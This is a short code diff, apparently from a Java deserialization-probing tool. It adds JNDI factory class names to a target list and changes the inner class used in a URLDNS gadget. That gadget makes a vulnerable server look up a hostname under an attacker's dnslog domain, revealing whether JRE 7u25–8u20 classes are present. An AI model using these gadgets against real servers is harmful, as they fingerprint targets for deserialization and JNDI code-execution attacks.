@@ -52,6 +52,8 @@ public class en {
 			"org.apache.tomcat.jdbc.pool.DataSourceFactory",
 			"org.apache.juli.logging.LogFactory",
 			"com.alibaba.druid.pool.DruidDataSourceFactory",
+			"com.zaxxer.hikari.HikariJNDIFactory",
+			"org.slf4j.LoggerFactory",
 			"com.ibm.ws.client.applicationclient.ClientJ2CCFFactory",
 			"com.ibm.ws.webservices.engine.client.ServiceFactory"
 			};
@@ -164,7 +166,7 @@ public class en {
 			break;
 		case "JRE8u20":
 	  		//7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
-	  		HashMap JRE8u20 = getURLDNSgadget("http://JRE8u20."+dnslog, "javax.swing.JComponent$2");
+	  		HashMap JRE8u20 = getURLDNSgadget("http://JRE8u20."+dnslog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
 	  		list.add(JRE8u20);
 			break;
 		case "winlinux":
